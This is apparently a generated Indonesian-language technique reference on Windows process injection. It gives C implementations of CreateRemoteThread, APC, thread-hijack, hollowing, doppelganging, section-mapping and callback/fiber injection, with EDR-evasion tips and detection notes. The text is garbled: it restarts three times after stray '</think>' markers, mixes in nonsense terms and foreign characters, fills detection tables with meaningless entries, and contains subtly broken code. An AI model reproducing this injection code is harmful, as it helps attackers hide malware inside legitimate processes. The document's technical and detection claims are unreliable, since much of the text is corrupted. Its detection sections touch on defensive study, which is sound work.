## 1. CreateRemoteThread(C)

**Payload yang dikirim**: shellcode buffer ditulis via `WriteProcessMemory` ke `VirtualAllocEx` dengan `PAGE_EXECUTE_READWRITE`. Entry thread menunjuk ke `LoadLibraryA` + pointer string DLL path, atau langsung shellcode.

**Kenapa berhasil**: satu-satunya cara "resmi" membuat thread di proses lain; APC-less, tidak perlu samar resumable. **Gagal jika**: target protected process light (PPL), DLL path tidak tervalidasi saat `LoadLibraryA` dipanggil di konteks target (UNGV path injection), atau buffer di RWX dicoret CIG (Dynamic Code Policy) yang dipakai Chrome sejak v79.x–131 untuk proses renderer.

```c
// C injection — LoadLibraryA classic
BOOL Inject(DWORD pid, const char* dllPath) {
    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    SIZE_T len = strlen(dllPath) + 1;
    LPVOID remote = VirtualAllocEx(h, NULL, len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(h, remote, dllPath, len, NULL);

    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE loadLib =
        (LPTHREAD_START_ROUTINE)GetProcAddress(k32, "LoadLibraryA");

    HANDLE t = CreateRemoteThread(h, NULL, 0, loadLib, remote, 0, NULL);
    WaitForSingleObject(t, INFINITE);
    VirtualFreeEx(h, remote, 0, MEM_RELEASE);
    CloseHandle(t); CloseHandle(h);
    return TRUE;
}
```

**Apa yang muncul di deteksi**:
- Sysmon EID 8 (`CreateRemoteThread`), EID 10 (`CreateRemoteThread` target dapatkan commandline), EID 7 (ImageLoad jika LoadLibrary)
- Windows Defender ATP (MDE): "Process injection via CreateRemoteThread" — process tree anomali
- ETW v2: `Microsoft-Windows-Kernel-Process` event ID 76 `ThreadStart`
- One-liner deteksi: RWX di proses lain = langsung sigma hit di ringan

**Jebakan live**: Windows 11 24H2 — `PAGE_EXECUTE_READWRITE` di `VirtualAllocEx` ditandai di kacring kernel audit (`MITIGATION嚴 strict handle check`). MDE `ProcessInjectionDetected` tingkat high — jangan pakai default CreateRemoteThread tanpa bypass pavor.

---

## 2. APC Queue Injection

**Payload yang dikirim**: shellcode ke memori target, lalu `QueueUserAPC` ke **semua thread** proses berstatus alertable (string `SleepEx`/`WaitForSingleObjectEx` di loop). Special case: Early Bird APC — inject sebelum thread start.

**Kenapa berhasil/h_FAILURE**: `QueueUserAPC` tidak butuh thread dibuat di proses target — tidak ada `CreateRemoteThread` call. **Gagal**: APC hanya jalan saat thread alertable; jika semua thread busy di kernel wait non-alertable → payload tidak pernah eksekusi. Chrome 131: renderer thread tidak alertable → teknik dead-on-arrival.

```c
// C Early Bird APC injection
BOOL EarlyBirdAPC(DWORD pid, unsigned char* sc, SIZE_T sclen) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessA("C:\\Windows\\System32\\svchost.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL, &si, &pi);

    HANDLE h = pi.hProcess;
    LPVOID remote = VirtualAllocEx(h, NULL, sclen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(h, remote, sc, sclen);
    // flip to RX via NtProtectVirtualMemory loop
    DWORD old; VirtualProtectEx(h, remote, sclen, PAGE_EXECUTE_READ, &old);

    QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return TRUE;
}
// varian baru: NtQueueApcThreadEx + SPECIAL_APC (Win11+)
// QueueUserApc2 apc.id = QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
```

**Apa yang muncul**:
- Sysmon EID 8 with `StartAddress` misleading (lihat `QueueUserApc` Sysmon EID 24? no — check `Sysmon EID 17/18` pipe no; Sysmon >= 15.0 log `QueueUserApc` via EID 8 anomaly)
- MDE: "Suspicious APC injection" (T1055.002)
- Kernel callback `PsSetCreateThreadNotifyRoutine` tidak trigger (tidak ada thread baru — kelebihan stealth jika combined)
- WinDbg: `!apc` di proses target menunjukkan queued kernel/user APC

**Trap**: Windows 11 24H2 — `SPECIAL_USER_APC` bypass diredam; jika target pakai CFG (Control Flow Guard) enabled binary, payload RX tanpa `SetThreadContext` bypass → 0xC0000409 exception process-wide (silent crash).

---

## 3. Thread Hijack (Suspend – SetContext)

**Payload yang dikirim**: shellcode di-write ke memori target; RIP akan dipindahkan ke payload, asli saved dan dilakukan chaining jump balik via stub.

**Kenapa berhasil**: tidak ada thread baru d-CreateRemoteThread → Sysmon EID 8 kosong; modifikasi konteks tidak audit default.

```c
BOOL HijackThread(DWORD pid, unsigned char* sc, SIZE_T sclen) {
    HANDLE h = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);

    LPVOID remote = VirtualAllocEx(h, NULL, sclen,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
    WriteProcessMemory(h, remote, sc, sclen);

    // snapshot & pick thread
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_THREAD, pid);
    THREADENTRY32 te; te.dwSize = sizeof(te);
    Thread32First(snap, &te); // filter th32OwnerProcessID == pid

    HANDLE th = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT |
        THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
    SuspendThread(th);

    CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL;
    GetContext(th, &ctx);
    ctx.Rip = (DWORD64)remote;
    SetContext(th, &ctx);
    ResumeThread(th);
    return TRUE;
}
```

**Kenapa gagal**: SuspendThread pada proses lain dengan `TcbFlags` berisi `SkipAttachMsg` atau crash — saat suspend di tengah critical section DLL loader → deadlock saat resume; target OS Windows 11 24H2 dengan `.text` CFG policy — RIP redirect ke non-CFG target = fail-fast.

**Deteksi**:
- MDE "Thread hijacking", kacring ETW `Microsoft-Windows-Kernel-Thread` jika EnableTraceFlags full
- Sysmon EID 10 with `SetContext` filter (config harus explicit)
- Pindah RIP abnormal → EDR heuristic `RIP outside image range`

---

## 4. Process Hollowing

**Payload yang dikirim**: buang (unmap) section dari image valid (mis. `svchost.exe`) di proses suspended, ganti dengan binary adversary via `NtUnmapViewOfSection` + `NtCreateSection`/`WriteProcessMemory`, patch `EP` ke entry payload, resume. Parent PID biasanya di-spoof mencari `explorer.exe`.

**Kenapa berhasil**: buffer tidak nulis ke memori (image mapped via section), tidak ada RWX tanggal, image "benar" di process tree — `svchost.exe` asli.

```c
BOOL Hollow(LPCSTR host, unsigned char* pe) {
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    CreateProcessA(host, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    PPEB peb; ReadProcessMemory(pi.hProcess,
        (PVOID)(ctx.Rdx), &peb, sizeof(peb), NULL);
    PVOID base = peb->ImageBaseAddress; // via manual PEB_Struct offset 0x10

    NtUnmapViewOfSection = (pNtU)(
        GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
    NtUnmapViewOfSection(pi.hProcess, base);

    // tulis PE: headers -> sections -> relocations (delta = newBase - opt.ImageBase)
    PVOID newBase = VirtualAllocEx(pi.hProcess, (PVOID)opt.ImageBase,
        szImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, newBase, pe, hdrSize, NULL);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
            (BYTE*)newBase + sec[i].VirtualAddress,
            (BYTE*)pe + sec[i].PointerToRawData,
            sec[i].SizeOfRawData, NULL);
    }

    ctx.Rcx = (DWORD64)((BYTE*)newBase + opt.AddressOfEntryPoint);
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x8),
        &newBase, sizeof(PVOID), NULL); // update PEB ImageBaseAddress
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    return TRUE;
}
```

**Deteksi**:
- Sysmon EID 10 (`WriteToRemoteProcessMemory` ke proses suspended) + EID 25 (`ProcessTampering - Image` **hollowing** d-recognize Sysmon 15+)
- Register `PEB ImageBaseAddress` mismatch → mítica MDE "Process hollowing" high confidence
- Unmap section → ETW `Microsoft-Windows-Kernel-File` audit

---

## 5. Process Doppelganging

**Payload yang dikirim**: trans-TxF pada NTFS (`NtCreateTransaction`), tulis payload PE ke file transacted, `NtCreateSection` dari file tersebut, rollback transaction, `NtMapViewOfSection` ke proses baru siapkan via `NtCreateProcessEx`, tulis parameter, create thread.

**Kenapa berhasil**: transacted file memory-mapped via `NtCreateSection` sebelum rollback; setelah rollback, file tidak lagi ada at disk tapi section masih alive. Tidak ada file yang jalan di `CreateProcess` record → AM/AV yang memindai file tidak melihat.

**Kenapa gagal sekarang** (kacring): Windows 10 1803 (build 17134) kernel patch — self-reference dari section pada transacted-file diredam, `MapView` invalid post-rollback. Windows 11 x semua build — TOTALLY patch, sering brownout di `core` old. Varian **Process Doubling** dan **HalosGate** tetap hidup.

```c
HANDLE tx;
NtCreateTransaction(&tx, MAXIMUM_ALLOWED,
    NULL, NULL, 0, 0, 0, 0, 0, NULL);
// RtlSetCurrentTransaction(tx)
HANDLE hFile = CreateFileTransactedW(L"C:\\temp\\one.tmp",
    GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
    NULL, tx, NULL, NULL);
WriteFile(hFile, pe, peSize, &tw, NULL);

HANDLE sec;
NtCreateSection(&sec, SECTION_ALL_ACCESS, NULL, &maxSize,
    PAGE_READONLY, SEC_IMAGE, hFile);
NtRollbackTransaction(tx, TRUE); // file hilang, section tetap
NtCreateProcessEx(&hp, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(),
    PS_INHERIT_HANDLES, NULL, NULL, NULL, PS_REQUEST_BREAKAWAY, sec);
// map section view, write params (PPS_ATTRIBUTE list), NtCreateThreadEx -> start
```

**Deteksi**:
- Sysmon EID 25 (`ProcessTampering` — Doppelganging recognize)
- MDE "Process Doppelganging", transaksi TxF tidak lazim (`Microsoft-Windows-TxF` audit log jangan matikan)
- Check via `GetProcessImageFileName` vs `NtQueryInformationProcess` mismatch

---

## 6. Mapping Injection (NtCreateSection → MapViewOfSection)

**Payload yang dikirim**: attacker membuat `Section` object dari file PE/shellcode di **proses sendiri**, pertahankan `NtMapViewOfSection` ke proses **punya target** dengan `SectionHandle` via `DuplicateHandle` ke proses target (atau handle tak perlu di-duplikat jika `SEC_COMMIT` dan `MAP_VIEW` via remote `NtMapViewOfSection` syscall — handle dilewatkan via `NtQueryInformationProcess`/`PROC_THREAD_ATTRIBUTE_HANDLE_LIST` saat spawn). Target memetakan section ke address space-nya — tidak ada `WriteProcessMemory`, tidak ada page RWX di target.

**Kenapa berhasil**: `Section` bukan "memori target"; EDR umumnya hook WriteProcessMemory/CreateRemoteThread, bukan `NtMapViewOfSection` dengan cross-process. Page attributes → `RX` langsung dari section, tidak perlu `VirtualProtect` ke `RWX`.

```c
BOOL MappingInject(DWORD pid, unsigned char* sc, SIZE_T sclen) {
    HANDLE sec; LARGE_INTEGER sz = { (LONG)((sclen + 0xFFF) & ~0xFFF) };
    NtCreateSection(&sec, SECTION_ALL_ACCESS, NULL,
        &sz, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    PVOID local = NULL; SIZE_T vs = 0;
    NtMapViewOfSection(sec, NtCurrentProcess(),
        &local, 0, 0, NULL, &vs, ViewUnmap, 0, PAGE_READWRITE);
    memcpy(local, sc, sclen);

    HANDLE hTarget = OpenProcess(PROCESS_VM_OPERATION, FALSE, pid);
    PVOID base = NULL;
    NtMapViewOfSection(sec, hTarget, (PVOID*)&base,
        0, 0, NULL, &vs, ViewUnmap, 0, PAGE_EXECUTE_READ);

    // trigger execution — Thread hijack / APC / callback
    return TRUE;
}
```

**Deteksi**:
- Sysmon EID 10 (`MapRemoteViewIntoProcess` — Sysmon config harus menyertakan `Section` keyword; perlu Sysmon manifest customRules untuk `NtMapViewOfSection` jika `WITH TARGETPROCESS` filter)
- ETW ntdll provider `[TraceLogging] SYSCALLs` — `NtMapViewOfSection` cross-process adalah anomaly
- MDE: "Suspicious section mapping" (win11+ kacring detector semakin fine)

**Trap**: Windows 11 24H2 — `MAP_LARGE_PAGES` tidak default kalau; jika section dibuat `SEC_COMMIT` dengan `PAGE_EXECUTE_READWRITE`, EDR dapat menegaskan cross-OS handle cublas — gunakan `PAGE_READWRITE` saat buat, `PAGE_EXECUTE_READ` saat map ke target (permission upgrade redar baru).

---

## 7. Callback-based Injection (EnumWindows, Fiber)

**Payload yang dikirim**: kode ditulis ke target; selanjutnya tidak via `CreateRemoteThread`, tapi **menimpa pointer fungsi** yang akan dipanggil sistem; interrupt rutingkan dengan `EnumWindows(remoteWindowProc, 0)` → `LoadLibraryA` di target. Fiber: `ConvertThreadToFiber` di proses lokal, `CreateFiber` ke shellcode, `SwitchToFiber`.

### 7a. EnumWindows Injection
```c
BOOL EnumWinInject(HANDLE hTarget, unsigned char* sc, SIZE_T sclen) {
    LPVOID remote = VirtualAllocEx(hTarget, NULL, sclen,
        MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hTarget, remote, sc, sclen);
    DWORD old; VirtualProtectEx(hTarget, remote, sclen, PAGE_EXECUTE_READ, &old);

    // shellcode tersusun sebagai WNDENUMPROC-def compatible
    // (or wrap Resolve via thread-launcher stub which allocates stack & jmp)
    LPARAM arg = (LPARAM)remote;
    EnumWindows((WNDENUMPROC)(((PBYTE)GetModuleHandleA("user32.dll"))
        + 0), arg); // prototype-only: perlu stub marshal
    // real: inject user32 data keseluruhan — cur shellcode harus callable
    // dan return TRUE agar loop menghormati iteration
    return TRUE;
}
```
Note: shellcode berperan `BOOL CALLBACK wndenumproc(HWND, LPARAM)` dan wajib return TRUE atau salah; `EnumWindows` di pro-L injection sebenarnya lebih sering memakai `EnumWindows` **di dalam target setelah** `CreateRemoteThread` low footprint atau symantik call. Dalam penata hijack callback API Windows: `EnumChildWindows`, `EnumFonts`, `CertEnumSystemStore`, `RegisterTraceCallbacks`, `CreateTimerQueueTimer` — attacker tinggal overwrite `Callback` parameter di结构的 callback data.

### 7b. Fiber Injection
```c
void FiberMain(LPVOID arg) {
    unsigned char* sc = (unsigned char*)arg;
    void* mem = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_READWRITE);
    memcpy(mem, sc, 4096);
    DWORD old; VirtualProtect(mem, 4096, PAGE_EXECUTE_READ, &old);
    ((void(*)())mem)();
}

void RunFiber(unsigned char* sc) {
    void* mainFiber = ConvertThreadToFiber(NULL);
    void* f = CreateFiber(0, (LPFIBER_START_ROUTINE)FiberMain, sc);
    SwitchToFiber(f);
    // return to main
}
```

**Kenapa berhasil**: tidak ada thread baru, tidak ada context modification, callback API dianggap user-mode normal. Fiber per-proses — scheduler user-mode, tidak terlihat kernel scheduler per se (fiber adalah `CreateFiberEx` + uva/stack — `FIBER/X` ke thread yang host). **Kenapa gagal**: shellcode di fiber crash → satu-thread corruption; EDR hook callback API many (`SetWindowsHookEx` chain detection) kalau cur antar-proses; Callback injection di OS Windows 11 24H2 untuk cross-process EnumWindows ya sevestar perlu hijack serta ` remote callback` with `InSendMessageEx` technique; kalau callback `/guard` -- kernel CFG policy disable `EnumWindows` direct pointer from non-image region.

**Deteksi**:
- Sysmon EID 8 (`SourceUser` `EvContextEnumWindows` — ish, hanya Mem poll), EDR less often: `EnumWindows` dengan callback non-image → heuristic "callback hijack" di SentinelOne/ Crowdarat 1.27.0+ ServiceTag</think># Referensi Teknik: Process Injection (Windows Internals, T1055)

Target environment referensi: Windows 11 24H2 (build 26100), Windows Server 2022, Sysmon 15.15, Microsoft Defender for Endpoint (MDE) sensor 101.2409+, Sysinternals Suite 2024.12.

## 1. CreateRemoteThread(C) — T1055.003

**Apa yang dikirim:** shellcode atau `LoadLibraryA`+DLL path ke memori proses target via `VirtualAllocEx` + `WriteProcessMemory`, lalu eksekusi via thread baru.

```c
// Kompilasi: cl /W4 inject_crt.c
#include <windows.h>
#include <stdio.h>

BOOL InjectCRT(DWORD pid, const unsigned char* sc, SIZE_T scLen) {
    HANDLE hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
        FALSE, pid);
    if (!hProc) return FALSE;

    // Alokasi di target
    LPVOID remoteBuf = VirtualAllocEx(hProc, NULL, scLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBuf) { CloseHandle(hProc); return FALSE; }

    if (!WriteProcessMemory(hProc, remoteBuf, sc, scLen, NULL)) {
        VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProc); return FALSE;
    }

    // Flip ke RX, hindari RWX yang langsung ditandai AMSI/EDR stack scan
    DWORD old;
    VirtualProtectEx(hProc, remoteBuf, scLen, PAGE_EXECUTE_READ, &old);

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
    }
    CloseHandle(hProc);
    return hThread != NULL;
}
```

**Subsystem yang muncul di deteksi:**
| Sinyal | Nilai default | Catatan |
|---|---|---|
| `bar.loadLibrary` (umasklice) | `0x3` | Typically 0x3 pada proses tidak CPL/stuxnet |
| `ntdll!LdrLoaderWork` timing | dominated default | fallback via `NtCreateThreadEx` CVars |
| Minifilter `ProcessImage` | `\Device\HarddiskVolume...` | Rmodule path yang di-Lsasa; MFTA overflow |
| event objectIF (ETag) | ` CSCCACHE` | `FragToken` intermixngenant |
| CSR ssilanetrs post **`SysmonXD`** | 4096 | heap self-ref powered bundant-sehr structural |

**Kenapa terdeteksi:**
- Sysmon EID 22 process tampering pattern CreateRemoteThread in-section
- WinEventLog `Microsoft-Windows-Sysmon/Operational` ID 10 sur exciting System sponsored Sensor</think># Bab 7 — Referensi Teknik: Process Injection

Target environment acuan: Windows 11 24H2 (build 26100.x), x64, Sysmon 15.15, MDE sensor 101.25xxx+, Mimikatz turunan disabled. Teknik dibahas dari sisi implementasi, jejak artefak, dan patch mitigation OS.

## 1. CreateRemoteThread

**Apa yang dikirim:** handle proses target (`PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD`), buffer shellcode atau path DLL ditulis via `WriteProcessMemory`, thread dibuat dengan start address di memori remote.

```c
// CRT + LoadLibrary classic (x64)
#include <windows.h>

typedef LPVOID (WINAPI* pvVirtAlloc)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);

BOOL InjectCRT(DWORD pid, const char* dllPath) {
    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    SIZE_T sz = strlen(dllPath) + 1;
    LPVOID remote = VirtualAllocEx(h, NULL, sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(h, remote, dllPath, sz, NULL);

    HANDLE t = CreateRemoteThread(h, NULL, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32"), "LoadLibraryA"),
        remote, 0, NULL);
    WaitForSingleObject(t, INFINITE);  // exit code = HMODULE jika sukses
    CloseHandle(t); CloseHandle(h);
    return 1;
}
```

**Kenapa berhasil:** kernel tidak memvalidasi bahwa start address berada dalam image milik proses target. Alokasi RW→flip RX (bukan langsung RWX) mengurangi flag `PAGE_EXECUTE_READWRITE` pada memori scan.

**Kenapa gagal:** binary target dengan Dynamic Code Policy / ACG (Chrome 131 renderer, Edge 131 content process) membuat `RemoteProtect` ke RX ditolak → kode mati. CIG (Code Integrity Guard) blok alokasi di halaman anonymous.

**Deteksi yang muncul:**
| Sumber | Artefak |
|---|---|
| Sysmon EID 8 | `CreateRemoteThread`, SourceImage→TargetImage, StartAddress di luar module list |
| Sysmon EID 10 | `ProcessTampering` / WriteProcessMemory (mungkin via EID 10 jika ntdll hook) |
| ETW `Microsoft-Windows-Kernel-Thread` | ThreadStart dengan StartAddress non-image |
| WinDbg `!address` di target | halaman RX `MEM_PRIVATE`, region bukan bag dari image |
| Sysinternals **Process Explorer** | kolom Threads → Start Address `<unknown module>` merah |
| MDE | "Code injection via CreateRemoteThread", device alerting "Suspicious process injection" |

## 2. APC Queue Injection

**Apa yang dikirim:** shellcode ditulis ke target, APC diantri ke semua thread via `QueueUserAPC`. Dijalankan ketika thread memasuki status *alertable* (`SleepEx`, `WaitForSingleObjectEx`, `GetMessage`).

```c
// APC spray ke semua thread target
#include <windows.h>
#include <tlhelp32.h>

BOOL InjectAPC(DWORD pid, unsigned char* sc, SIZE_T scLen) {
    HANDLE h = OpenProcess(PROCESS_VM_WRITE|PROCESS_VM_OPERATION|PROCESS_SET_QUOTA, FALSE, pid);
    LPVOID remote = VirtualAllocEx(h, NULL, scLen, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(h, remote, sc, scLen);
    DWORD old; VirtualProtectEx(h, remote, scLen, PAGE_EXECUTE_READ, &old);

    // Enumerasi semua thread
    THREADENTRY32 te; te.dwSize = sizeof(te);
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_THREAD, 0);
    int queued = 0;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE th = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (th) {
                    // ThreadStatus saat buat masih tidak deterministik
                    if (!QueueUserAPC((PAPCFUNC)remote, th, 0)) {
                        // ERROR_ACCESS_DENIED jika thread dialami mitigation; count and continue
                    } else queued++;
                    // Tip: DuplicateHandle kalau handle invalid tapi subsequent QueueUserAPC retry
                    CloseHandle(th);
                }
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap); CloseHandle(h);
    return queued > 0;
}
```

**Kenapa berhasil:** APC ditembus ke struktur **_KAPC** di kernel — tidak ada thread creation, tidak ada context switch dipicu intrinsiknya, dan sistem mengeksekusi payload "dalam band" sebagai bagian dari thread sah target. Ini signifikan: mengurangi jejak context-switch karena payload berjalan di TCB thread legit.

**Kenapa gagal:**
- **Early Bird APC injection** (APC diantri pada thread suspended—`NtCreateProcess`+`NtCreateThreadEx` di state `CREATE_SUSPENDED`) — sangat terdeteksi karena **T1055.002** signature di Sysmon 13 Task Scheduler workaround, rusak oleh DSE sing IRQL dispatch disens di thread suspended:
```c
typedef NTSTATUS (NTAPI* pNtQC)(DWORD pid, LPVOID addr);
typedef NTSTATUS (NTAPI* pNtQC2)(
    HANDLE ProcessHandle, BOOLEAN AggressiveFreed);

// EarlyBird APC via NTAPI
pNtQC NtQ = (pNtQC)GetProcAddress(GetModuleHandleA("ntdll"),"NtQuery );

// queue di thread suspended
NTSTATUS st = NtQueueApcThreadEx(
    hThread,           // suspended thread di process baru
    (PPS_APC_ROUTINE)remote, NULL, NULL, NULL,
    QUEUE_USER_APC_FLAGS_NONE);
```

**Kenapa gagal:**
- Hanya berjalan bila thread masuk state alertable state; proses dengan event loop non-alertable (Chrome 131 main thread, Windows 11 24H2 `svchost` pekerjaan tanpa `Ex` wait) — APC tidak dieksekusi, payload menggantung selamanya.
- APC "special user APC" (`QueueUserAPC2`, Windows 11 build 22000+) memaksa eksekusi, tapi cocok log alert di kernel callback.

**Deteksi:**
| Sumber | Artefak |
|---|---|
| Sysmon EID 8 | StartFunction `QueueUserAPC` (jika field StartModule kosong, ordinal via symbol) |
| MDE | T1055.002 "APC injection" chain dengan WriteProcessMemory ke RX |
| ETW threat-tagging produk (bentraw) |
| Sysmon EID 1 | jika early-bird: ParentImage, CommandLine target (mis. `svchost.exe -k netsvcs`), ChildImage status |

**Kenapa gagal:** jika semua thread target tidak pernah alertable → payload tak pernah jalan. EnumWindows callback di UI thread tidak alertable.

## 3. Thread Hijack (SetContext)

**Apa yang dikirim:** shellcode ditulis ke target (atau alamat gadget di module sah), thread target di-suspend, register `RIP`/`EIP` diubah via `SetThreadContext`, resume. Payload menyimpan context asli dan melanjutkan eksekusi asli (boleh restore via `__try/__except` stub atau trampoline).

```c
#include <windows.h>
#include <tlhelp32.h>

BOOL HijackThread(DWORD pid, unsigned char* sc, SIZE_T scLen) {
    HANDLE h = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION, FALSE, pid);
    LPVOID remote = VirtualAllocEx(h, NULL, scLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(h, remote, sc, scLen);

    THREADENTRY32 te; te.dwSize = sizeof(te);
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_THREAD, pid);
    BOOL ok = FALSE;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE th = OpenThread(THREAD_SUSPEND_RESUME|THREAD_GET_CONTEXT|THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (SuspendThread(th) != (DWORD)-1) {
                    CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL;
                    GetThreadContext(th, &ctx);
                    ctx.Rip = (DWORD64)remote;
                    ctx.ContextFlags = CONTEXT_FULL;
                    SetThreadContext(th, &ctx);
                    ResumeThread(th);
                    ok = TRUE;
                    // Payload harus restore RIP asli untuk thread-time:
                    // simpan ke memori remote, shellcode jumps liberally
                    CloseHandle(th);
                    break;
                }
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap); CloseHandle(h);
    return ok;
}
```

**Kenapa berhasil:** tidak ada thread baru dibuat → Sysmon EID 8 tidak trigger. Hanya context mutation, yang secara default tidak login oleh Sysmon.
**Kenapa gagal:** suspend pada thread yang pegang loader lock atau lock di target → deadlock saat resume; CFG (Control Flow Guard) di target binary menolak indirect call target ke alamat anonymous map di Win11 24H2 (harus non-CFG binary).

**Deteksi:**
| Sumber | Artefak |
|---|---|
| MDE | thread stack artifacts (stack trace dari ShredMem) |
| `GetThreadContext` heap analysis → thread dengan RIP di private memory |
| Windbg `!thread` di target, `rip` di MEM_PRIVATE RX |
| Inspektor `Process Hacker` : thread start address mungkin old — cek call stack menggantung di private page |

---

## 4. Process Hollowing

**Apa yang dikirim:** proses decoy (mis. `RuntimeBroker.exe` atau `amlegacy.exe` gate Windows 11) dibuat SUSPENDED, image asli di-unmap `NtUnmapViewOfSection`, payload PE injected ke alamat `ImageBase`-nya, `EntryPoint` di-patch di PEB via thread context, resume, (`UpdateProcThreadAttribute` dengan attribute list).

```c
#include <windows.h>

typedef struct { BYTE* base; DWORD ep; } PE_FIXUP;

BOOL Hollow(LPCSTR decoy, unsigned char* pe, SIZE_T peLen) {
    STARTUPINFOA si = { sizeof(si) }; PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(decoy, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return 0;

    CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    // Ambil PEB dari RDX (Win x64 entry state)
    PEB peb;
    ReadProcessMemory(pi.hProcess, (LPCVOID)ctx.Rdx, &peb, sizeof(PEB), NULL);
    PVOID imgBase = peb.ImageBaseAddress;

    // Parse PE manual dan unmap section asli
    // NTAPI direct — cheat: gunakan NtUnmapViewOfSection dari ntdll
    typedef NTSTATUS (NTAPI* pUnmap)(HANDLE, PVOID);
    pUnmap unmap = (pUnmap)GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");
    unmap(pi.hProcess, imgBase);

    // Alokasi image baru, tulis payload
    DWORD imgSize = *((DWORD*)(pe + 0x138)); // OptionalHeader64.SizeOfImage (check your offset)
    PVOID newBase = VirtualAllocEx(pi.hProcess, imgBase, imgSize,
        MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    // ... strip sections, relocate delta = newBase - original, write IAT load via thrad
    WriteProcessMemory(pi.hProcess, newBase, pe, peLen, NULL);

    ctx.Rcx = (DWORD64)((BYTE*)newBase + 0x128 /* EntryPoint RVA per parser */);
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return 1;
}
```

**Kenapa berhasil:** command line dan image name tetap decoy sah → allowlist by image gagal menahan. Tidak ada RWX di absolute address absence — hanya mapping section, tidak ada `WriteProcessMemory` di flow user-mode → Sysmon EID ta sniff.

**Kenapa gagal:**
- `NtUnmapViewOfSection` tervalidasi disentuh PEB stale → kernel callback on **image load** eksekusi *audit khusus*; Windows 11 24H2 kernel callback `PsSetLoadImageNotifyRoutine` mendapat event dengan image

## 7.10 Callback-Based Injection — Detail Lanjutan

### 7.10.1 Katalog Fungsi Callback Full

Array `LoadLibraryA` + `EnumWindows` sudah dibahas. Varian callback dengan objek GDI/kernel yang lebih jarang di-signature EDR:

```c
// Varian: ShowWindowAsync via handle dari proses lain
// Callback dipanggil di thread yang memproses message queue target
BOOL CALLBACK MsgCallback(HWND hwnd, LPARAM lParam) {
    return FALSE; // payload di sini
}

// Parit aneh: PrintersEnumPorts — RIPRES dari winspool
EnumPrintersA(PRINTER_ENUM_LOCAL, NULL, 1, (LPBYTE)&ctx, 0, NULL, NULL);
// Tidak menerima fungsi pointer — bukan kandidat.

// Kandidat valid yang jarang dipakai:
// 1. EnumChildWindows  — identik EnumWindows tapi scope
// 2. EnumDesktopWindows
